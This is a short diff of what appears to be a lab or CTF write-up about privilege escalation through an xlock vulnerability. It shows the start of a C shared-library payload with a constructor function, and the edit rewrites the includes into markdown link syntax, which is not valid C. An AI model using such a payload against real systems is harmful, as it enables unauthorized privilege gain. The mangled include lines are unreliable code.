@@ -159,9 +159,9 @@ To add the user to `auth` group, the `xlock` vulnerability will allow to add use
 Copied the C payload:
 
 ```c
-#include <paths.h>
-#include <sys/types.h>
-#include <unistd.h>
+#include [paths.h](paths.h)
+#include [sys/types.h](sys/types.h)
+#include [unistd.h](unistd.h)
 
 static void __attribute__ ((constructor)) _init (void) {
     gid_t rgid, egid, sgid;
